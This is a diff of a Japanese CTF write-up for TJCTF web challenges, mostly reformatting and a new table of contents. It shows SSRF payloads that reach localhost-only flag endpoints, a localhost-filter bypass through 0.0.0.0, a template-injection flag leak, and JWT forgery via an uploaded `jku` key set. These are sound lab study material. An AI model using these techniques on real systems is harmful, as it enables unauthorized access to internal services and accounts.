@@ -10,6 +10,16 @@ meta:
 
 ---
 
+- [[web] frog](#[web]-frog)
+- [[web] reader](#[web]-reader)
+- [[web] fetcher](#[web]-fetcher)
+- [[web] templater](#[web]-templater)
+- [[web] music-checkout](#[web]-music-checkout)
+- [[web] topplecontainer](#[web]-topplecontainer)
+- [[web] kaboot](#[web]-kaboot)
+
+---
+
 ## [web] frog
 
 `robots.txt`を見ると`Disallow: /secret-frogger-78570618/`の記載がある．
@@ -27,6 +37,7 @@ meta:
 ## [web] reader
 
 `site`に入力したurlの内容をとってきて表示してくれるっぽい．
+
 ```py
 @app.route("/")
 def index():
@@ -55,6 +66,7 @@ def index():
 
         return render_template("site_view.html", content=content)
 ```
+
 プログラムを読むと，`/monitor`にてflagの表示をしてくれるが，リクエスト元のアドレスが`127.0.0.1`か`localhost`でないとダメらしい．
 
 ```py
@@ -71,7 +83,6 @@ def monitor():
 
 `/?site=http://127.0.0.1:5000/monitor`として`/monitor`の内容を取得すればいい
 
-
 ---
 
 ## [web] fetcher
@@ -81,35 +92,41 @@ def monitor():
 
 ```js
 app.post('/fetch', async (req, res) => {
-    const url = req.body.url;
+  const url = req.body.url
 
-    if (!/^https?:\/\//.test(url))
-        return res.send('invalid url');
+  if (!/^https?:\/\//.test(url)) return res.send('invalid url')
 
-    try {
-        const checkURL = new URL(url);
+  try {
+    const checkURL = new URL(url)
 
-        if (checkURL.host.includes('localhost') || checkURL.host.includes('127.0.0.1'))
-            return res.send('invalid url');
-    } catch (e) {
-        return res.send('invalid url');
-    }
+    if (
+      checkURL.host.includes('localhost') ||
+      checkURL.host.includes('127.0.0.1')
+    )
+      return res.send('invalid url')
+  } catch (e) {
+    return res.send('invalid url')
+  }
 
-    const r = await fetch(url, { redirect: 'manual' });
+  const r = await fetch(url, { redirect: 'manual' })
 
-    const fetched = await r.text();
+  const fetched = await r.text()
 
-    res.send(fetched);
-});
+  res.send(fetched)
+})
 ```
 
 ```js
 app.get('/flag', (req, res) => {
-    if (req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
-        return res.send('bad ip');
+  if (
+    req.ip !== '::ffff:127.0.0.1' &&
+    req.ip !== '::1' &&
+    req.ip !== '127.0.0.1'
+  )
+    return res.send('bad ip')
 
-    res.send(`hey myself! here's your flag: ${flag}`);
-});
+  res.send(`hey myself! here's your flag: ${flag}`)
+})
 ```
 
 [url-format-bypass](https://book.hacktricks.xyz/v/jp/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) を参考に`http://0.0.0.0`をfetchさせることで通った．
@@ -131,7 +148,6 @@ flagのフォーマットが`tjctf{...}`であることから，`{{{{flag}}}`の
 
 となる．`tjctf{...`に対応する文字列を出力する必要があるが，`tjctf{...`なるkeyは用意していない．error文に最後の`}`を抜いたflagが出力される．
 ![alt text](./image-1.png)
-
 
 ---
 
@@ -240,26 +256,29 @@ def get_flag(user):
 ![alt text](./image-6.png)
 
 以下のような手順で解けそうである
+
 - ファイルのアップロードページにて自分で作成した公開鍵をアップロード
 - idをadmin，jkuをアップロード後の公開鍵のパスとしたjwtを作成
 - `/flag`にアクセス
 
 まず公開鍵をアップロードして
+
 ```json
 {
-    "keys": [
-        {
-            "kty": "EC",
-            "crv": "P-256",
-            "x": "0QCXT0NvlTA9Rg6BE9YVnRGQCP9iqnalG-52qL1r_88",
-            "y": "5H3jm2p6Cm5lnY7aMa6bVt1YJ7rveUm1ykTfUUAecqI",
-            "kid": "1"
-        }
-    ]
+  "keys": [
+    {
+      "kty": "EC",
+      "crv": "P-256",
+      "x": "0QCXT0NvlTA9Rg6BE9YVnRGQCP9iqnalG-52qL1r_88",
+      "y": "5H3jm2p6Cm5lnY7aMa6bVt1YJ7rveUm1ykTfUUAecqI",
+      "kid": "1"
+    }
+  ]
 }
 ```
 
 以下のようにjwtを作成して終わり
+
 ```py
 import jwt
 
@@ -331,7 +350,7 @@ def room_sock(sock, room_id):
     }).encode()))
 ```
 
-以下の部分を読むと，スコアを問題数 * 1000点以上稼げばいいことがわかる．
+以下の部分を読むと，スコアを問題数 \* 1000点以上稼げばいいことがわかる．
 
 ```py
 sock.send(b64encode(json.dumps({
@@ -412,6 +431,5 @@ for i, q in enumerate(kahoot['questions']):
 result = ws.recv()
 print("Received:", b64decode(result))
 ```
-
 
 </div>
